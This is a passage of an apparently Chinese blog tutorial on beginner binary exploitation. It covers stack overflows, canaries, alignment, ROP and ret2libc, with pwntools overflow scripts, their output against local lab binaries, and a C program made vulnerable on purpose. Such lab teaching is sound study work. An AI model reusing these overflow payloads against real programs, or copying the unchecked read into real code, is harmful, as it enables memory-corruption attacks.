&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">proc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x41&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">100&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">proc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>结果：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-1 » python exploit32.py
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[+] Starting local process &amp;#39;./question32&amp;#39;: pid 640653
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] Process &amp;#39;./question32&amp;#39; stopped with exit code 0 (pid 640653)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">buffer: 0xffc0bf88, secret: 0xffc0bfec
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cool!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="64位栈上缓冲区溢出">64位栈上缓冲区溢出&lt;/h3>
&lt;p>x86-64架构下的栈上缓冲区溢出和 32 位架构有所不同，主要区别在于 64位 ELF 多了很多保护机制，直接影响栈上缓冲区溢出的就有 stack canary。&lt;/p>
&lt;h4 id="stack-canary">stack canary&lt;/h4>
&lt;p>关于 stack canary 机制的解释摘录如下。&lt;/p>
&lt;blockquote>
&lt;p>Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately.&lt;/p>
&lt;/blockquote>
&lt;p>尝试让 gcc 吐出带 canary 的汇编如下，命令 &lt;code>gcc -S question.c -g -O0 -fstack-protector -o question64.s&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">main:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> endbr64
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pushq %rbp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq %rsp, %rbp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> addq $-128, %rsp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq %fs:40, %rax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq %rax, -8(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xorl %eax, %eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movl $305419896, -116(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -112(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -104(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -96(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -88(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> // 略
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movl $0, %eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq -8(%rbp), %rdx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> subq %fs:40, %rdx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> je .L5
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> call __stack_chk_fail@PLT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.L5:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> leave
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ret
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在函数序言部分多出了几条指令：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> movq %fs:40, %rax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq %rax, -8(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xorl %eax, %eax
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>而末尾返回之前多了一条判断：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> movl $0, %eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq -8(%rbp), %rdx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> subq %fs:40, %rdx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> je .L5
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> call __stack_chk_fail@PLT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.L5:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> leave
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ret
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>明显能看出，&lt;code>%fs:40&lt;/code> 就是上文引用中所谓的 &lt;em>a secret value placed on the stack which changes every time the program is started&lt;/em> 。&lt;/p>
&lt;h4 id="栈对齐">栈对齐&lt;/h4>
&lt;p>在64位系统上，栈默认会对齐到 16 字节（也许看编译器默认参数，在我的实验环境中是这样的）。例如案例中 &lt;code>question.c&lt;/code> 的 &lt;code>secret&lt;/code> 我们可以看做 4 字节大小（&lt;em>具体大小和你的系统、CPU、编译器都有关系&lt;/em>），也就是 &lt;code>buffer&lt;/code> 加上 &lt;code>secret&lt;/code> 一共 104 个字节，除 16 得 6.5 显然是没对齐的。编译器会自动分配对齐到 16 字节的栈大小：112 。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">main:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pushq %rbp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq %rsp, %rbp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> subq $112, %rsp # align to 16 bytes
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movl $305419896, -4(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -112(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -104(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -96(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -88(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -80(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -72(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -64(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -56(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -48(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -40(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -32(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -24(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movl $0, -16(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> leaq -4(%rbp), %rdx # %rdx =&amp;gt; secret
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> leaq -112(%rbp), %rax # %rax =&amp;gt; buffer
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>简单计算可得 &lt;code>-4(%rbp) ~ (%rbp)&lt;/code> 是 &lt;code>secret&lt;/code>，&lt;code>-12(%rbp) ~ -4(%rbp)&lt;/code> 是为了对齐而填充的大小。&lt;/p>
&lt;p>如果我们想溢出覆盖 &lt;code>secret&lt;/code> 的值，则需要填充 100 字节的 &lt;code>buffer&lt;/code> + 8 字节的对齐 + 4 字节 &lt;code>secret&lt;/code> 值，一共 112 字节的 payload。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">pwn&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">proc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pwn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./question64&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">b&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">struct&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;@q&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x1234&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">proc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x41&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">100&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x00&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="mi">8&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">proc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>结果：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-1 » python exploit64.py
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[+] Starting local process &amp;#39;./question64&amp;#39;: pid 10128
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">b&amp;#39;4\x12\x00\x00\x00\x00\x00\x00&amp;#39;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] Process &amp;#39;./question64&amp;#39; stopped with exit code 0 (pid 10128)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">buffer: 0x7ffc03d29950, secret: 0x7ffc03d299bc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cool!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="rop-基础">ROP 基础&lt;/h2>
&lt;p>有趣的部分真正开始。ROP 全称是 &lt;em>Return Oriented Programming&lt;/em>，一种通过返回指令串联代码片段，以执行复杂逻辑的技术思想。参考文章：&lt;a class="link" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#rop" target="_blank" rel="noopener"
>ctf wiki - 基本ROP&lt;/a>。&lt;/p>
&lt;h3 id="原理-1">原理&lt;/h3>
&lt;p>从简单的开始说起。&lt;code>call&lt;/code>指令的本质是压栈IP寄存器接一个无条件跳转指令。而&lt;code>ret&lt;/code>指令本质是从栈上弹出一个地址，然后无条件跳转。&lt;/p>
&lt;p>那么能用&lt;code>ret&lt;/code>替代&lt;code>call&lt;/code>指令吗？把&lt;code>ret&lt;/code>当成&lt;code>jmp&lt;/code>来用，当然没什么不能的（考虑 x86/cdecl 调用约定）。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220816110634684.png"
width="681"
height="455"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220816110634684_hu1e91792cb936de74538b3afcb26b0fa4_141437_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220816110634684_hu1e91792cb936de74538b3afcb26b0fa4_141437_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220816110634684"
class="gallery-image"
data-flex-grow="149"
data-flex-basis="359px"
>&lt;/p>
&lt;p>&lt;code>ret&lt;/code> 指令执行后，栈上布局就会变成：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220816110756861.png"
width="411"
height="215"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220816110756861_hu826fa0eb13028bd3969e5fe5a03dc856_22934_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220816110756861_hu826fa0eb13028bd3969e5fe5a03dc856_22934_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220816110756861"
class="gallery-image"
data-flex-grow="191"
data-flex-basis="458px"
>&lt;/p>
&lt;p>和正常函数调用如出一辙。&lt;/p>
&lt;h3 id="aslr">ASLR&lt;/h3>
&lt;p>想要实现自由控制跳转地址和参数的目的，还有一个拦路虎叫 ASLR 不作更多解释。通过 &lt;code>sysctl&lt;/code> 或编辑 &lt;code>/proc/sys/kernel/randomize_va_space&lt;/code> 控制。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-makefile" data-lang="makefile">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">.PHONY&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="n">disable&lt;/span>-&lt;span class="n">aslr&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">disable-aslr&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="p">|&lt;/span> sudo tee /proc/sys/kernel/randomize_va_space
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">.PHONY&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="n">enable&lt;/span>-&lt;span class="n">aslr&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">enable-aslr&lt;/span>&lt;span class="o">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">echo&lt;/span> &lt;span class="m">1&lt;/span> &lt;span class="p">|&lt;/span> sudo tee /proc/sys/kernel/randomize_va_space
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>之后可以多次运行 &lt;code>question32&lt;/code> ，观察输出来确认栈地址是否变化。&lt;/p>
&lt;h3 id="ret2libc">ret2libc&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// gcc question.c -m32 -fno-stack-protector -no-pie -g -O0 -o question32
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">char&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;name: %p buffer: %p&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;what&amp;#39;s your name?&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">STDIN_FILENO&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Welcome, %s. Show your hack skill.&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">STDIN_FILENO&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x100&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>简单写一个脚本。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">pwn&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">gdb&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">process&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">p32s&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">):&lt;/span>
